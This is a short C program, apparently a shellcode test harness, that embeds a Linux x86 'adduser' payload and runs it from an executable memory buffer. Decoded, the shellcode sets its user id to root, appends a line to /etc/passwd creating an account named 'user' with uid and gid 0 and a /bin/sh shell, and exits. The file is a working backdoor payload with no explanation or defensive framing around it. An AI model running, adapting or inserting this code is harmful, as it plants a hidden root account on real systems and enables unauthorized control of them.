#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>

char shellcode[] = \

// linux/x86/adduser

"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x75\x73"
"\x65\x72\x3a\x41\x7a\x77\x31\x37\x63\x54\x6e\x6e\x4a\x41\x41"
"\x41\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
"\x80";


// linux/x86/...
/*
*/

// linux/x86/...
/*
*/

void main()
{
	printf("[*] Creating executable buffer...\n");
	char *buf;
	int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	buf = mmap(0, sizeof(shellcode), prot, flags, -1, 0);

	printf("[*] Copying shellcode into buffer (%d bytes)...\n", strlen(shellcode));
	memcpy(buf, shellcode, sizeof(shellcode));

	printf("[*] Running shellcode...\n");
    ((void (*)(void))buf)();    
}

